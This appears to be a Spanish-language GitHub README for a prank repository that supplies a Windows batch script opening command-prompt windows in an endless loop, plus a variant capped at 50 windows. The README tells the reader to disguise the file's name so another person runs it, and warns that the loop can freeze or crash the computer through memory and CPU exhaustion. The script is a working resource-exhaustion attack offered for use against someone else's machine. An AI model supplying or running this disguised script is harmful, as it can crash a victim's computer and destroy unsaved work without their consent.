# infinity-cmd-troll

## Explicación
Este repo contiene un archivo .bat que al ejecutarlo abrirá infinitas consolas "cmd", ideal para hacer bromas (pesadas)
> [!WARNING]  
> Ejecutar esto abrirá una cantidad ilimitada de terminales y puede hacer que tu PC se congele o crashee por uso excesivo de memoria y CPU. Si lo pruebas, asegúrate de cerrarlo rápidamente o limitar el número de iteraciones.

## Uso
### A TODO O NADA
- Clonar el repositorio ```https://github.com/brunoalbin23/imagen-Dado``` o copiar el siguiente fragmento de código en un .txt y cambiar el formato a.bat al guardarlo
- ```
  @echo off
  :loop
  start cmd
  goto loop ```
- Modificar el nombre para que parezca inofensivo (dificl si la persona sabe lo que es un .bat)
- Ejecutar haciendole click

### si no tienes huevos
- Si no te animas a ejecutar el código anterior por miedo a romper todo, hay una variación limitando la cantidad de ventanas que queremos abrir, hacer los mismos pasos anteriores pero con el siguiente fragmento de código
- ```
  @echo off
  setlocal enabledelayedexpansion
  set count=0

  :loop
  if %count%==50 exit
  start cmd
  set /a count+=1
  goto loop```

plis no rompas nada :)
